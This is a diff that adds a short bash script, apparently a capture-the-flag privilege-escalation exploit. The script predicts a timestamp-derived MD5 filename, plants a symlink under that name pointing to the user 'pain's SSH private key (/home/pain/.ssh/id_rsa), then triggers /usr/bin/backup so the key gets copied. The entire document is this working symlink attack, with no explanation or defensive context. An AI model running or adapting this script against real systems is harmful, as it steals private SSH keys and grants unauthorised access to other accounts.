@@ -1,0 +1,13 @@
+#!/bin/bash
+
+time=$(date +%T -d "$time + 10 seconds")
+now=$(echo -n "$time" | md5sum | awk '{print $1}')
+echo "$now"
+ln -s  /home/pain/.ssh/id_rsa "$now"
+sleep 10
+echo "$(date +%T)"
+/usr/bin/backup
+
+
+
+
